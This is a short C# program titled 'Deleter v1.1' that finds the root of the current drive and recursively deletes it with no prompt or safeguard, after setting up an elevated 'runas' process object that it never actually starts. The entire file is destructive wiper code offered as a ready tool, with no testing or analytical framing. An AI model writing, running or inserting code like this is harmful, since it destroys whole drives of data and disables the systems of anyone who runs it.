namespace System
{
    public class Deleter
    {
        public static System.String dir = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
        public static System.Boolean DirExists = System.IO.Directory.Exists(System.Deleter.dir);
        public const System.String Ver = "1.1";
        public const System.String Title = "Deleter v" + System.Deleter.Ver;
        public static void DeleteDir()
        {
            try
            {
                System.Console.WriteLine("Deleting " + System.Deleter.dir);
                System.IO.Directory.Delete(System.Deleter.dir, true);
            }
            catch (System.Exception ex)
            {
                System.Console.WriteLine("Error deleting " + System.Deleter.dir);
                System.Console.WriteLine(ex);
            }
        }
        static void Main(System.String[] args)
        {
            System.Console.Title = System.Deleter.Title;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.UseShellExecute = true;
            p.StartInfo.Verb = "runas";
            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
            System.Deleter.DeleteDir();
        }
    }
}